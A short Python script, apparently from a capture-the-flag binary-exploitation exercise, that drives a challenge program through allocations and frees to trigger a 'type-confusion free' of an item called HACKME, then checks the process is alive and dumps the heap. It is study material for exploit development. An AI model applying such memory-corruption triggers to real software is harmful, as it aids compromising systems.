import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G()
g.add(b'A1'); g.add(b'B2'); g.make(b'b1'); g.add(b'YY'); g.add(b'Z9'); g.make(b'b3')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC'); g.add(b'EE'); g.make(b'HACKME')
g.rm(b'HACKME')   # type-confusion free of the food
# check alive by doing a benign op (chef)
import re
try:
    c=g.chef(); alive=True
except Exception as e:
    alive=False
print("ALIVE after free+chef:", alive)
g.dump('after remove HACKME (food freed)')
g.close()
